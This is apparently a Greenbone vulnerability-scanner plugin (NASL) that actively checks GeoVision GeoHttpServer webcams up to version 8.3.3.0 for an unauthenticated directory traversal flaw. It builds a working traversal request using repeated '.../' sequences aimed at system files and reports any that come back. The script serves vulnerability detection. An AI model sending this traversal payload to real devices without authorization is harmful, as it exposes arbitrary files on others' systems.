# SPDX-FileCopyrightText: 2015 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805072");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2015-06-25 15:49:40 +0530 (Thu, 25 Jun 2015)");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("GeoVision GeoHttpServer WebCams <= 8.3.3.0 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 81);
  script_mandatory_keys("GeoHttpServer/banner");

  script_tag(name:"summary", value:"GeoVision GeoHttpServer WebCams is prone to a directory
  traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw allows unauthenticated attackers to download arbitrary
  files through path traversal.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read
  arbitrary files on the target system.");

  script_tag(name:"affected", value:"GeoVision GeoHttpServer version 8.3.3.0 and probably prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/37258");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 81);

banner = http_get_remote_headers(port: port);
if (!banner || "Server: GeoHttpServer" >!< banner)
  exit(0);

files = traversal_files();

foreach file (keys(files)) {

  url = "/" + crap(data: ".../", length: 3 * 5) + "/" + files[file];

  if (http_vuln_check(port: port, url: url, pattern: file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
